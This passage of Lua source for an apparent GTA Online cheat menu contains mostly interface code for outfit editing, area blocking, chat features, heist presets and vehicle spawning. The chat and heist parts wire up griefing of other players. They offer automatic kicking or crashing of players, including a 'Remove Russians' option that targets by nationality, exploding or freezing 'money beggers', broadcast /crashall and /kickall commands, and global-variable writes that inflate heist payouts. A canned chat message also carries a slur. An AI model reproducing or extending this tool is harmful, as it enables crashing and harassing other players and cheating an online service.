                                if i == 4 and var[i] == 144 then
                                    var[i] = var[i] - 1
                                end
                                if i == 6 and var[i] == 102 then
                                    var[i] = var[i] - 1
                                end
                                if i == 8 and var[i] == 189 then
                                    var[i] = var[i] - 1
                                end
                                if i == 11 and var[i] == 393 then
                                    var[i] = var[i] - 1
                                end
                            end
                            if var[i] > varmax[i] then
                                var[i] = 0
                            end
                            outfiteditor[i][2] = var[i]
                            set.comp_var(get.ped_id(), i, outfiteditor[i][2], 0, 0)
                            update_outfit()
                        end
                    )
                    same_line()
                    add_button(
                        ">\n\n" .. i,
                        vec2(23, 23),
                        function()
                            var[i] = get.drawable(get.ped_id(), i)
                            varmax[i] = get.drawable_num(get.ped_id(), i)
                            varmax[i] = varmax[i] - 1
                            var[i] = var[i] + 1
                            if
                                skipcomp and
                                    (PED.IS_PED_MODEL(get.ped_id(), female) or PED.IS_PED_MODEL(get.ped_id(), male))
                             then
                                if i == 1 and var[i] == 51 then
                                    var[i] = var[i] + 1
                                end
                                if i == 1 and var[i] == 90 then
                                    var[i] = var[i] + 1
                                end
                                if i == 1 and var[i] == 107 then
                                    var[i] = var[i] + 1
                                end
                                if i == 1 and var[i] == 111 then
                                    var[i] = var[i] + 1
                                end
                                if i == 1 and var[i] == 116 then
                                    var[i] = var[i] + 1
                                end
                                if i == 1 and var[i] == 169 then
                                    var[i] = var[i] + 1
                                end
                                if i == 1 and var[i] == 187 then
                                    var[i] = var[i] + 1
                                end
                                if i == 5 and var[i] == 8 then
                                    var[i] = var[i] + 1
                                end
                            end
                            if
                                i == 1 and var[i] == 120 and
                                    (PED.IS_PED_MODEL(get.ped_id(), female) or PED.IS_PED_MODEL(get.ped_id(), male))
                             then
                                var[i] = var[i] + 1
                            end
                            if var[i] < 0 then
                                var[i] = varmax[i]
                            end
                            if PED.IS_PED_MODEL(get.ped_id(), female) then
                                if i == 4 and var[i] == 151 then
                                    var[i] = var[i] + 1
                                end
                                if i == 6 and var[i] == 106 then
                                    var[i] = var[i] + 1
                                end
                                if i == 8 and var[i] == 234 then
                                    var[i] = var[i] + 1
                                end
                                if i == 11 and var[i] == 415 then
                                    var[i] = var[i] + 1
                                end
                            elseif PED.IS_PED_MODEL(get.ped_id(), male) then
                                if i == 4 and var[i] == 144 then
                                    var[i] = var[i] + 1
                                end
                                if i == 6 and var[i] == 102 then
                                    var[i] = var[i] + 1
                                end
                                if i == 8 and var[i] == 189 then
                                    var[i] = var[i] + 1
                                end
                                if i == 11 and var[i] == 393 then
                                    var[i] = var[i] + 1
                                end
                            end
                            if var[i] > varmax[i] then
                                var[i] = 0
                            end
                            outfiteditor[i][2] = var[i]
                            set.comp_var(get.ped_id(), i, outfiteditor[i][2], 0, 0)
                            update_outfit()
                        end
                    )
                    same_line()
                    if var[i] ~= nil then
                        add_text(tostring(var[i]))
                    end
                    end_menu()
                end
                if begin_menu(outfiteditor[i][3], true) --[[component texture]] then
                    same_line()
                    add_button(
                        " <\n\n" .. -i,
                        vec2(23, 23),
                        function()
                            var[i] = get.drawable(get.ped_id(), i)
                            txtvar[i] = PED.GET_PED_TEXTURE_VARIATION(get.ped_id(), i)
                            txtvarmax[i] = PED.GET_NUMBER_OF_PED_TEXTURE_VARIATIONS(get.ped_id(), i, var[i])
                            txtvarmax[i] = txtvarmax[i] - 1
                            txtvar[i] = txtvar[i] - 1
                            if txtvar[i] < 0 then
                                txtvar[i] = txtvarmax[i]
                            elseif txtvar[i] > txtvarmax[i] then
                                txtvar[i] = 0
                            end
                            outfiteditor[i][4] = txtvar[i]
                            set.comp_var(get.ped_id(), i, get.drawable(get.ped_id(), i), outfiteditor[i][4], 0)
                            update_outfit()
                        end
                    )
                    same_line()
                    add_button(
                        ">\n\n" .. -i,
                        vec2(23, 23),
                        function()
                            var[i] = get.drawable(get.ped_id(), i)
                            txtvar[i] = PED.GET_PED_TEXTURE_VARIATION(get.ped_id(), i)
                            txtvarmax[i] = PED.GET_NUMBER_OF_PED_TEXTURE_VARIATIONS(get.ped_id(), i, var[i])
                            txtvarmax[i] = txtvarmax[i] - 1
                            txtvar[i] = txtvar[i] + 1
                            if txtvar[i] < 0 then
                                txtvar[i] = txtvarmax[i]
                            elseif txtvar[i] > txtvarmax[i] then
                                txtvar[i] = 0
                            end
                            outfiteditor[i][4] = txtvar[i]
                            set.comp_var(get.ped_id(), i, get.drawable(get.ped_id(), i), outfiteditor[i][4], 0)
                            update_outfit()
                        end
                    )
                    same_line()
                    if txtvar[i] ~= nil then
                        add_text(tostring(txtvar[i]))
                    end
                    end_menu()
                end
                separator()
            end
            for i = 1, #outfiteditorprops do
                if begin_menu(outfiteditorprops[i][1], true) --[[prop]] then
                    same_line()
                    add_button(
                        " <\n\n\n" .. i,
                        vec2(23, 23),
                        function()
                            propvar[i] = get.prop(get.ped_id(), i - 1)
                            propvarmax[i] = get.prop_num(get.ped_id(), i - 1)
                            propvarmax[i] = propvarmax[i] - 1
                            propvar[i] = propvar[i] - 1
                            if propvar[i] < 0 then
                                propvar[i] = propvarmax[i]
                            elseif propvar[i] > propvarmax[i] then
                                propvar[i] = 0
                            end
                            outfiteditorprops[i][2] = propvar[i]
                            set.prop(get.ped_id(), i - 1, outfiteditorprops[i][2], 0, true)
                            update_outfit()
                        end
                    )
                    same_line()
                    add_button(
                        ">\n\n\n" .. i,
                        vec2(23, 23),
                        function()
                            propvar[i] = get.prop(get.ped_id(), i - 1)
                            propvarmax[i] = get.prop_num(get.ped_id(), i - 1)
                            propvarmax[i] = propvarmax[i] - 1
                            propvar[i] = propvar[i] + 1
                            if propvar[i] < 0 then
                                propvar[i] = propvarmax[i]
                            elseif propvar[i] > propvarmax[i] then
                                propvar[i] = 0
                            end
                            outfiteditorprops[i][2] = propvar[i]
                            set.prop(get.ped_id(), i - 1, outfiteditorprops[i][2], 0, true)
                            update_outfit()
                        end
                    )
                    same_line()
                    if propvar[i] ~= nil then
                        add_text(tostring(propvar[i]))
                    end
                    end_menu()
                end
                if begin_menu(outfiteditorprops[i][3], true) --[[prop texture]] then
                    same_line()
                    add_button(
                        " <\n\n\n" .. -i,
                        vec2(23, 23),
                        function()
                            propvar[i] = get.prop(get.ped_id(), i - 1)
                            txtpropvar[i] = PED.GET_PED_PROP_TEXTURE_INDEX(get.ped_id(), i - 1)
                            txtpropvarmax[i] =
                                PED.GET_NUMBER_OF_PED_PROP_TEXTURE_VARIATIONS(get.ped_id(), i - 1, propvar[i])
                            txtpropvarmax[i] = txtpropvarmax[i] - 1
                            txtpropvar[i] = txtpropvar[i] - 1
                            if txtpropvar[i] < 0 then
                                txtpropvar[i] = txtpropvarmax[i]
                            elseif txtpropvar[i] > txtpropvarmax[i] then
                                txtpropvar[i] = 0
                            end
                            outfiteditorprops[i][4] = txtpropvar[i]
                            set.prop(get.ped_id(), i - 1, get.prop(get.ped_id(), i - 1), outfiteditorprops[i][4], true)
                            update_outfit()
                        end
                    )
                    same_line()
                    add_button(
                        " >\n\n\n" .. -i,
                        vec2(23, 23),
                        function()
                            propvar[i] = get.prop(get.ped_id(), i - 1)
                            txtpropvar[i] = PED.GET_PED_PROP_TEXTURE_INDEX(get.ped_id(), i - 1)
                            txtpropvarmax[i] =
                                PED.GET_NUMBER_OF_PED_PROP_TEXTURE_VARIATIONS(get.ped_id(), i - 1, propvar[i])
                            txtpropvarmax[i] = txtpropvarmax[i] - 1
                            txtpropvar[i] = txtpropvar[i] + 1
                            if txtpropvar[i] < 0 then
                                txtpropvar[i] = txtpropvarmax[i]
                            elseif txtpropvar[i] > txtpropvarmax[i] then
                                txtpropvar[i] = 0
                            end
                            outfiteditorprops[i][4] = txtpropvar[i]
                            set.prop(get.ped_id(), i - 1, get.prop(get.ped_id(), i - 1), outfiteditorprops[i][4], true)
                            update_outfit()
                        end
                    )
                    same_line()
                    if txtpropvar[i] ~= nil then
                        add_text(tostring(txtpropvar[i]))
                    end
                    end_menu()
                end
                separator()
            end
            add_button(
                text["Clear Props"],
                vec2(165, 23),
                function()
                    PED.CLEAR_ALL_PED_PROPS(get.ped_id())
                    update_outfit()
                end
            )
            end_window()
        end
        pop_style_var(1)
    end
end
function cleararea_window()
    if is_open() then
        push_style_var(ImGuiStyleVar_WindowRounding, 3.5)
        if begin_window(text["Clear Area"], 1 << 6) then
            add_checkbox(
                text["Vehicles"],
                function(on)
                    cvehicles = on
                end
            )
            add_checkbox(
                text["Ojects"],
                function(on)
                    cobjects = on
                end
            )
            add_checkbox(
                text["Peds"],
                function(on)
                    cped = on
                end
            )
            separator()
            add_button(
                text["Clear Area"],
                vec2(150, 23),
                function()
                    if clarea == nil then
                        clear_area()
                    end
                end
            )
            end_window()
        end
        pop_style_var(1)
    end
end
function blockfeatures_window()
    if is_open() then
        push_style_var(ImGuiStyleVar_WindowRounding, 3.5)
        if begin_window(text["Block Areas"], 1 << 6) then
            add_button(
                text["Block Orbital Room"],
                vec2(170, 23),
                function()
                    block_shit(-1003748966, 328.337, 4828.734, -58.553, 0.0, 90.0, 0.0, true)
                end
            )
            add_button(
                text["Block All LSC"],
                vec2(170, 23),
                function()
                    block_shit(1693207013, -1145.897, -1991.144, 14.1836, 0.0, -0.0, 135.0001, true)
                    block_shit(1693207013, 723.1160, -1088.831, 23.2320, -0.0, -0.0, -90.0, true)
                    block_shit(1693207013, -356.0905, -134.7714, 40.0130, 0.0, -0.0, -110.0, true)
                    block_shit(1693207013, 1174.6543, 2645.2222, 38.6396, 0.0, -0.0, -179.9241, true)
                    block_shit(1693207013, 1182.3055, 2645.2324, 38.6396, 0.0, -0.0, -179.9241, true)
                    block_shit(1693207013, 114.3135, 6623.2334, 32.6731, 0.0, 0.0, 44.4347, true)
                    block_shit(1693207013, 108.8502, 6617.8770, 32.6731, 0.0, 0.0, 44.4347, true)
                    block_shit(1693207013, -205.6828, -1310.682, 30.2957, 0.0, -0.0, -0.0, true)
                end
            )
            add_button(
                text["Block All Ammu-Nation"],
                vec2(170, 23),
                function()
                    block_shit(1693207013, 1699.9373, 3753.4202, 34.8553, 0.0, 0.0, 47.3919, true)
                    block_shit(1693207013, 243.8379, -46.5232, 70.0910, 0.0003, -0.0, -110.0001, true)
                    block_shit(1693207013, 842.7685, -1024.539, 28.3448, 0.0, -0.0, -180.0, true)
                    block_shit(1693207013, -324.2730, 6077.1094, 31.6047, 0.0, 0.0, 44.9999, true)
                    block_shit(1693207013, -662.6415, -944.3256, 21.9792, 0.0, -0.0, -0.0, true)
                    block_shit(1693207013, -1314.465, -391.6472, 36.8457, -0.0001, 0.0001, -104.2217, true)
                    block_shit(1693207013, -1120.070, 2691.5046, 18.7041, 0.0, 0.0, 41.8271, true)
                    block_shit(1693207013, -3163.811, 1083.7786, 20.9887, 0.0, 0.0, 66.5813, true)
                    block_shit(1693207013, 2568.3037, 303.3556, 108.8848, 0.0, -0.0, -180.0, true)
                end
            )
            add_button(
                text["Block Casino"],
                vec2(170, 23),
                function()
                    block_shit(-1003748966, 924.796, 46.537, 82.332, 0.0, 90.0, 0.0, true)
                    block_shit(-1003748966, 936.130, 0.807, 79.608, 0.0, 90.0, 0.0, true)
                    block_shit(-1003748966, 987.713, 80.519, 81.877, 0.0, 90.0, 0.0, true)
                    block_shit(-1003748966, 966.303, 61.289, 112.845, 0.0, 90.0, 0.0, true)
                end
            )
            add_button(
                text["Block Eclipse Towers"],
                vec2(170, 23),
                function()
                    block_shit(-1003748966, -773.986, 313.359, 85.677, 0.0, 90.0, 0.0, true)
                    block_shit(-1003748966, -796.079, 308.323, 85.677, 0.0, 90.0, 0.0, true)
                    block_shit(-1003748966, -796.079, 308.323, 87.677, 0.0, 90.0, 0.0, true)
                end
            )
            add_button(
                text["Windmill Main LSC"],
                vec2(170, 23),
                function()
                    block_shit(1952396163, -405.3579, -142.0034, 35.9176, -90.0, 60.0, 0.0, false)
                end
            )
            add_button(
                text["Block Strip Club"],
                vec2(170, 23),
                function()
                    block_shit(1693207013, 127.9552, -1298.503, 29.4196, 0.0, 0.0, 30.0, true)
                end
            )
            end_window()
        end
        pop_style_var(1)
    end
end
function chatfeatures_window --[[fucking pice of shit why crashing]]()
    if is_open() then
        push_style_var(ImGuiStyleVar_WindowRounding, 3.5)
        if begin_window(text["Chat Features"], 1 << 6) then
            add_text(text["IMPORTANT!!!"])
            add_text(text["Enable Chat Logger to use other features"])
            separator()
            add_checkbox(
                text["Disable Chat"],
                function(on)
                    disablechat = on
                    DisableChat()
                end
            )
            separator()
            add_checkbox(
                text["Remove Russians"],
                function(on)
                    removerussians = on
                    RemoveRussia()
                end
            )
            if begin_menu(text["Reaction"] .. "\t", true) then
                add_checkbox(
                    text["Kick"],
                    function(on)
                        chatreaction[1] = on
                    end
                )
                add_checkbox(
                    text["Crash"],
                    function(on)
                        chatreaction[2] = on
                    end
                )
                end_menu()
            end
            separator()
            add_checkbox(
                text["Chat Spam Detection"],
                function(on)
                    spamdetection = on
                    SpamDetect()
                end
            )
            if begin_menu(text["Reaction"] .. "\t\t", true) then
                add_checkbox(
                    text["Kick"] .. " ",
                    function(on)
                        chatreaction[3] = on
                    end
                )
                add_checkbox(
                    text["Crash"] .. " ",
                    function(on)
                        chatreaction[4] = on
                    end
                )
                add_checkbox(
                    text["Notify"],
                    function(on)
                        chatreaction[5] = on
                    end
                )
                add_checkbox(
                    text["Kick + Notify"],
                    function(on)
                        chatreaction[6] = on
                    end
                )
                add_checkbox(
                    text["Crash + Notify"],
                    function(on)
                        chatreaction[7] = on
                    end
                )
                end_menu()
            end
            separator()
            add_checkbox(
                text["Punish Money Beggers"],
                function(on)
                    punishbeggers = on
                    PunishBeg()
                end
            )
            if begin_menu(text["Reaction"] .. "\t\t\t", true) then
                add_checkbox(
                    text["Explode"],
                    function(on)
                        chatreaction[8] = on
                    end
                )
                add_checkbox(
                    text["Freeze"],
                    function(on)
                        chatreaction[9] = on
                    end
                )
                add_checkbox(
                    text["Send To Island"],
                    function(on)
                        chatreaction[10] = on
                    end
                )
                add_checkbox(
                    text["Infinite Apartment Invite"],
                    function(on)
                        chatreaction[11] = on
                    end
                )
                add_checkbox(
                    text["Transaction Error"],
                    function(on)
                        chatreaction[12] = on
                    end
                )
                add_checkbox(
                    text["Kick"] .. "  ",
                    function(on)
                        chatreaction[13] = on
                    end
                )
                add_checkbox(
                    text["Crash"] .. "  ",
                    function(on)
                        chatreaction[14] = on
                    end
                )
                end_menu()
            end
            separator()
            add_text(text["Chat Commands:"])
            add_checkbox(
                text["All Players"],
                function(on)
                    CommandsEnable = on
                    ChatCommandsAll()
                end
            )
            add_checkbox(
                text["Friends Only"],
                function(on)
                    FriendsOnly = on
                    ChatCommandsFriends()
                end
            )
            add_checkbox(
                text["Don't Affect Friends"],
                function(on)
                    IgnoreFriends = on
                end
            )
            separator()
            add_button(
                text["Send Available lua Commands"],
                vec2(290, 23),
                function()
                    NETWORK.SEND_CHAT_MESSAGE(
                        "\n\n\n\n\n\n\n\n\n\nAvailable commands:\n/help\n/giveweapons\n/clearwanted\n/explodeall\n/crashall\n/kickall\n/vehiclegod\n/vehiclepaint\n/spawn <vehicle>\n/explode <pl>\n/kick <pl>\n/crash <pl>\n/sendtoisland <pl>\n/vehiclekick <pl>\n/trap <pl>\n/bounty <pl>\n/crush <pl>",
                        false
                    )
                end
            )
            add_button(
                text["Send Available XF Commands"],
                vec2(290, 23),
                function()
                    NETWORK.SEND_CHAT_MESSAGE(
                        "\n\n\n\n\n\n\n\n\n\nAvailable commands:\n/health\n/armor\n/repair\n/upgrade\n/clean\n/open\n/close\n/boost\n/launch\n/stop\n/ramp\n/gift\n/spawn <vehicle>",
                        false
                    )
                end
            )
            separator()
            add_text(text["Chat Singing:"])
            add_button(
                text["Open Folder"],
                vec2(290, 23),
                function()
                    open_file(path["ChatSinging"])
                end
            )
            add_button(
                text["Stop"],
                vec2(290, 23),
                function()
                    playsong = false
                end
            )
            for i = 1, #chatsongs do
                if begin_menu("" .. chatsongs[i], true) then
                    add_button(
                        text["Play"] .. "/" .. text["Stop"] .. "\n\n" .. i,
                        vec2(100, 23),
                        function()
                            playsong = not playsong
                            PlayOnChat(path["ChatSinging"] .. [[\]] .. chatsongs[i])
                        end
                    )
                    end_menu()
                end
            end
            end_window()
        end
        pop_style_var(1)
    end
end
function heist_helper()
    if is_open() then
        push_style_var(ImGuiStyleVar_WindowRounding, 3.5)
        if begin_window(text["Heist Helper"], 1 << 6) then
            if begin_tab_bar("heist_tab") then
                if begin_tab_item(text["Helper"]) then
                    add_checkbox(
                        text["Delete Cameras"],
                        function(on)
                            delete_cams = on
                            DelCams()
                        end
                    )
                    add_checkbox(
                        text["Shot Enemies"],
                        function(on)
                            shot_enemies = on
                            ShotEnemies()
                        end
                    )
                    add_checkbox(
                        text["Kill Enemies"],
                        function(on)
                            kill_enemies = on
                            KillEnemies()
                        end
                    )
                    add_checkbox(
                        text["Delete Enemies"],
                        function(on)
                            delete_enemies = on
                            DelEnemies()
                        end
                    )
                    separator()
                    if begin_menu(text["Casino Teleports"], true) then
                        for k, v in pairs(CasinoTeleports) do
                            add_text(k)
                            for i, e in pairs(v) do
                                add_button(
                                    text["Teleport To"] .. " " .. text[i],
                                    vec2(300, 25),
                                    function()
                                        TeleportSelf(e)
                                    end
                                )
                            end
                        end
                        end_menu()
                    end
                    separator()
                    if begin_menu(text["Cayo Teleports"], true) then
                        for k, v in pairs(CayoTeleports) do
                            add_text(k)
                            for i, e in pairs(v) do
                                add_button(
                                    text["Teleport To"] .. " " .. text[i],
                                    vec2(300, 25),
                                    function()
                                        TeleportSelf(e)
                                    end
                                )
                            end
                        end
                        end_menu()
                    end
                    separator()
                    add_button(
                        text["Spawn Kuruma"],
                        vec2(300, 25),
                        function()
                            SpawnVehicle(410882957, get.coords(get.id()), get.heading(get.id()), true, true, true)
                        end
                    )
                    add_button(
                        text["Spawn Oppressor"],
                        vec2(300, 25),
                        function()
                            SpawnVehicle(2069146067, get.coords(get.id()), get.heading(get.id()), true, true, true)
                        end
                    )
                    add_button(
                        text["Spawn Bati"],
                        vec2(300, 25),
                        function()
                            SpawnVehicle(3403504941, get.coords(get.id()), get.heading(get.id()), true, true, true)
                        end
                    )
                    separator()
                    add_button(
                        text["Load Weapons"],
                        vec2(300, 25),
                        function()
                            load_weapons()
                        end
                    )
                    add_button(
                        text["Clear Wanted For All"],
                        vec2(300, 25),
                        function()
                            for i = 0, 31 do
                                s.send_se(i, {-91354030, i, get.global_i(1893551 + (1 + (i * 599) + 510))})
                            end
                        end
                    )
                    add_button(
                        text["Teleport Forward"],
                        vec2(300, 25),
                        function()
                            pos = get.offset_coords(get.ped_id(), 0, 5, 0)
                            TeleportSelf(pos)
                        end
                    )
                    separator()
                    add_text(text["Quick Messages"])
                    add_checkbox(
                        text["Send To Selected Player"],
                        function(on)
                            sendtosel = on
                            while sendtosel do
                                if s.is_valid(get.selected()) then
                                    selectedplayer = get.name(get.selected())
                                end
                                s.wait(200)
                            end
                            if not sendtosel then
                                selectedplayer = ""
                            end
                        end
                    )
                    add_button(
                        selectedplayer .. " Come here!",
                        vec2(300, 25),
                        function()
                            send_message(selectedplayer .. " Come here!")
                        end
                    )
                    add_button(
                        selectedplayer .. " Wait!",
                        vec2(300, 25),
                        function()
                            send_message(selectedplayer .. " Wait!")
                        end
                    )
                    add_button(
                        selectedplayer .. " Now!",
                        vec2(300, 25),
                        function()
                            send_message(selectedplayer .. " Now!")
                        end
                    )
                    add_button(
                        selectedplayer .. " Don't hack!",
                        vec2(300, 25),
                        function()
                            send_message(selectedplayer .. " Don't hack!")
                        end
                    )
                    add_button(
                        selectedplayer .. " You fucking retard",
                        vec2(300, 25),
                        function()
                            send_message(selectedplayer .. " You fucking retard")
                        end
                    )
                    add_button(
                        selectedplayer .. " Take the loot",
                        vec2(300, 25),
                        function()
                            send_message(selectedplayer .. " Take the loot")
                        end
                    )
                    end_tab_item()
                end
                if begin_tab_item(text["Casino Presets"]) then
                    if begin_menu(text["Casino Presets"], true) then
                        add_button(
                            text["Silent (Hard)"],
                            vec2(300, 25),
                            function()
                                CasinoPreset(1, 1, 2)
                            end
                        )
                        add_button(
                            text["The Big Con (Hard)"],
                            vec2(300, 25),
                            function()
                                CasinoPreset(2, 2, 4)
                            end
                        )
                        add_button(
                            text["Aggressive (Hard)"],
                            vec2(300, 25),
                            function()
                                CasinoPreset(3, 3, 4)
                            end
                        )
                        add_button(
                            text["Silent (Normal)"],
                            vec2(300, 25),
                            function()
                                CasinoPreset(1, 0, 2)
                            end
                        )
                        add_button(
                            text["The Big Con (Normal)"],
                            vec2(300, 25),
                            function()
                                CasinoPreset(2, 0, 4)
                            end
                        )
                        add_button(
                            text["Aggressive (Normal)"],
                            vec2(300, 25),
                            function()
                                CasinoPreset(3, 0, 4)
                            end
                        )
                        end_menu()
                    end
                    add_checkbox(
                        text["100% Cut All Players"],
                        function(casino100)
                            while casino100 do
                                for i = 0, 3 do
                                    set.global_i(1966739 + 2326 + i, 100)
                                end
                                s.wait(1000)
                            end
                        end
                    ) --[[ add_checkbox(text["Casino $2.8 M"],function(casinomax) local cut={42,102,102,102} while casinomax do for i=1,4 do local p=i if p==1 then p=0 end set.global_i(1966739 + 2326 + p,cut[i]) end set.global_i(262145 + 28472,1410065408) s.wait(100) end end)]]
                    add_button(
                        text["Reset Casino Heist"],
                        vec2(300, 25),
                        function()
                            ResetCasino()
                        end
                    )
                    end_tab_item()
                end
                if begin_tab_item(text["Cayo Presets"]) then
                    if begin_menu(text["Cayo Presets"], true) then
                        add_checkbox(
                            text["$2.5 M (Solo)"],
                            function(on)
                                cayosolo = on
                                CayoPresets1()
                            end
                        )
                        add_checkbox(
                            text["$2.5 M (2 Players)"],
                            function(on)
                                cayo2 = on
                                CayoPresets2()
                            end
                        )
                        add_checkbox(
                            text["$2.5 M (3 Players)"],
                            function(on)
                                cayo3 = on
                                CayoPresets3()
                            end
                        )
                        add_checkbox(
                            text["$2.5 M (4 Players)"],
                            function(on)
                                cayo4 = on
                                CayoPresets4()
                            end
                        )
                        end_menu()
                    end
                    add_button(
                        text["Reset Cayo Perico Heist"],
                        vec2(300, 25),
                        function()
                            ResetCayo()
                        end
                    )
                    end_tab_item()
                end
                end_tab_bar()
            end
            end_window()
        end
        pop_style_var(1)
    end
end
function config_window()
    if is_open() then
        push_style_var(ImGuiStyleVar_WindowRounding, 3.5)
        set_next_window_size(vec2(380, 500))
        if begin_window(text["Settings"], 1 << 6) then
            if begin_tab_bar("settings_tab") then
                add_button(
                    text["Open Folder"],
                    vec2(350, 25),
                    function()
                        open_file(path["Xhax"])
                    end
                )
                separator()
                if begin_tab_item(text["General"]) then
                    for i = 1, #table_settings do
                        if not string.find(table_settings[i][1], "prot") then
                            if table_settings[i][2] == true then
                                setnam = "On"
                            else
                                setnam = "Off"
                            end
                            add_button(
                                setnam .. "\n\n" .. i,
                                vec2(30, 22),
                                function()
                                    table_settings[i][2] = not table_settings[i][2]
                                    if table_settings[9][2] then
                                        CheckForlua()
                                    end
                                    save_settings()
                                end
                            )
                            same_line()
                            add_text(text[table_settings[i][3]])
                        end
                    end
                    end_tab_item()
                end
                if begin_tab_item(text["Protections"]) then
                    for i = 1, #table_settings do
                        if string.find(table_settings[i][1], "prot") then
                            if table_settings[i][2] == true then
                                setpro = "On"
                            else
                                setpro = "Off"
                            end
                            add_button(
                                setpro .. "\n\n" .. i,
                                vec2(30, 22),
                                function()
                                    table_settings[i][2] = not table_settings[i][2]
                                    save_settings()
                                end
                            )
                            same_line()
                            add_text(text[table_settings[i][3]])
                        end
                    end
                    end_tab_item()
                end
                if
                    begin_tab_item(text["Vehicle Blacklist"]) --[[add_button('Save And Apply',vec2(350,25),function() save_veh_bl() end)]]
                 then
                    new_line()
                    add_button(
                        text["Reset All"],
                        vec2(350, 25),
                        function()
                            reset_veh_bl()
                        end
                    )
                    separator()
                    if begin_menu(text["Blacklisted"]) then
                        for i = 1, #vehicle_bl do
                            if vehicle_bl[i][2] == true then
                                add_text(vehicle_bl[i][3])
                            end
                        end
                        end_menu()
                    end
                    separator()
                    add_input_string_with_hint(
                        "      ",
                        text["[Search Vehicles]"],
                        function(string)
                            searchveh = string
                            vehresults = searchengine(searchveh, vehicle_names, false)
                        end
                    )
                    ishovered3 = is_item_hovered()
                    for i = 1, #vehicle_bl do
                        if searchveh == nil or searchveh == "" then
                            if vehicle_bl[i][2] == true then
                                isbl = text["Not Allowed"]
                            else
                                isbl = text["Allowed"]
                            end
                            if begin_menu(vehicle_bl[i][3]) then
                                add_button(
                                    isbl .. "\n\n" .. i,
                                    vec2(100, 22),
                                    function()
                                        vehicle_bl[i][2] = not vehicle_bl[i][2]
                                        save_veh_bl()
                                    end
                                )
                                end_menu()
                            end
                        else
                            if vehresults ~= nil then
                                for j = 1, #vehresults do
                                    if i == vehresults[j] then
                                        if vehicle_bl[i][2] == true then
                                            isbl = text["Not Allowed"]
                                        else
                                            isbl = text["Allowed"]
                                        end
                                        if begin_menu(vehicle_bl[i][3]) then
                                            add_button(
                                                isbl .. "\n\n" .. i,
                                                vec2(100, 22),
                                                function()
                                                    vehicle_bl[i][2] = not vehicle_bl[i][2]
                                                    save_veh_bl()
                                                end
                                            )
                                            end_menu()
                                        end
                                    end
                                end
                            else
                                if i == 1 then
                                    add_text(text["No results found!"])
                                end
                            end
                        end
                    end
                    end_tab_item()
                end
                if begin_tab_item(text["Hotkeys"]) then
                    add_text("Toggles won't work! (beta)")
                    new_line()
                    add_button(
                        text["Reset All Hotkeys"],
                        vec2(350, 25),
                        function()
                            for i = 1, #table_hotkeys do
                                del_hotkey(i)
                            end
                            save_hotkeys()
                        end
                    )
                    separator()
                    add_input_string_with_hint(
                        "       ",
                        text["[Search Functions]"],
                        function(string)
                            functionname = string
                            funcresults = searchengine(functionname, functions, false)
                        end
                    )
                    ishovered4 = is_item_hovered()
                    for i = 1, #table_hotkeys do
                        if functionname == nil or functionname == "" then
                            if begin_menu(table_hotkeys[i][4]) then
                                add_button(
                                    text["Register Hotkey"] .. "\n\n" .. i,
                                    vec2(130, 23),
                                    function()
                                        reg_hotkey(i)
                                    end
                                )
                                add_button(
                                    text["Delete Hotkey"] .. "\n\n" .. i,
                                    vec2(130, 23),
                                    function()
                                        del_hotkey(i)
                                        save_hotkeys()
                                    end
                                )
                                add_text(text["Hotkey"] .. ": " .. table_hotkeys[i][3])
                                end_menu()
                            end
                        else
                            if funcresults ~= nil then
                                for j = 1, #funcresults do
                                    if i == funcresults[j] then
                                        if begin_menu(table_hotkeys[i][4]) then
                                            add_button(
                                                text["Register Hotkey"] .. "\n\n" .. i,
                                                vec2(130, 23),
                                                function()
                                                    reg_hotkey(i)
                                                end
                                            )
                                            add_button(
                                                text["Delete Hotkey"] .. "\n\n" .. i,
                                                vec2(130, 23),
                                                function()
                                                    del_hotkey(i)
                                                    save_hotkeys()
                                                end
                                            )
                                            add_text(text["Hotkey"] .. ": " .. table_hotkeys[i][3])
                                            end_menu()
                                        end
                                    end
                                end
                            else
                                if i == 1 then
                                    add_text(text["No results found!"])
                                end
                            end
                        end
                    end
                    end_tab_item()
                end
                end_tab_bar()
            end
            end_window()
        end
        pop_style_var(1)
    end
end
function spawn_veh()
    if is_open() then
        push_style_var(ImGuiStyleVar_WindowRounding, 3.5)
        set_next_window_size(vec2(300, 500))
        if begin_window(text["Spawn Vehicle"], 1 << 6) then
            add_button(
                text["Close Window"],
                vec2(275, 25),
                function()
                    spawnerwindow = false
                end
            )
            separator()
            add_checkbox(
                text["Spawn Max Upgraded"],
                function(on)
                    maxupgrade = on
                end
            )
            add_checkbox(
                text["Spawn In God Mode"],
                function(on)
                    ingod = on
                end
            )
            separator()
            add_input_string_with_hint(
                "        ",
                text["[Search Vehicles]"],
                function(string)
                    searchvehs = string
                    vehresult = searchengine(searchvehs, vehicle_names, false)
                end
            )
            ishovered5 = is_item_hovered()
            for i = 1, #vehicle_names do
                if searchvehs == nil or searchvehs == "" then
                    if begin_menu(vehicle_names[i]) then
                        add_button(
                            text["Spawn"] .. "\n\n" .. i,
                            vec2(100, 22),
                            function()
                                Spawn_Vehicle(i, maxupgrade, ingod)
                            end
                        )
                        end_menu()
                    end
                else
                    if vehresult ~= nil then
                        for j = 1, #vehresult do
                            if i == vehresult[j] then
                                if begin_menu(vehicle_names[i]) then
                                    add_button(
                                        text["Spawn"] .. "\n\n" .. i,
                                        vec2(100, 22),
                                        function()
                                            Spawn_Vehicle(i, maxupgrade, ingod)
                                        end
                                    )
                                    end_menu()
                                end
                            end
                        end
                    else
                        if i == 1 then
                            add_text(text["No results found!"])
                        end
                    end
                end
            end
            end_menu()
        end
        pop_style_var(1)
    end
end
function VehicleSpawner()
    spawnerwindow = true
    while spawnerwindow do
        if ishovered5 then
            CONTROL.DISABLE_ALL_CONTROL_ACTIONS(0)
        end
        wait()
    end
end
function lobby_info()
    if infos[1] then
        push_style_var(ImGuiStyleVar_WindowRounding, 3.5)
        if begin_window(text["Lobby Info"], 1 << 0 | 1 << 6) then
            if table_settings[11][2] then
                add_text(text["Host"] .. ": " .. infos[2])
            end
            if table_settings[13][2] then
                add_text(text["Script Host"] .. ": " .. infos[4])
            end
            add_text(text["Players"] .. ": " .. infos[5] .. "\t\t\t\t\t\t\t\t\t\t\t")
            if table_settings[14][2] then
                add_text(text["Friends"] .. ": " .. infos[6])
            end
            if table_settings[12][2] then
                add_text(text["Modders"] .. ": " .. infos[3])
            end
            end_menu()
        end
        pop_style_var(1)
    end
end
function LobbyInf()
    while lobbyinf do
        infos = {false, "", 0, "", 0, 0}
        infos[1] = s.session_started()
        if infos[1] then
            local h = get.name(PLAYER.GET_HOST())
            if h == "**Invalid**" then
                h = ""
            end
            infos[2] = h
            for i = 0, 31 do
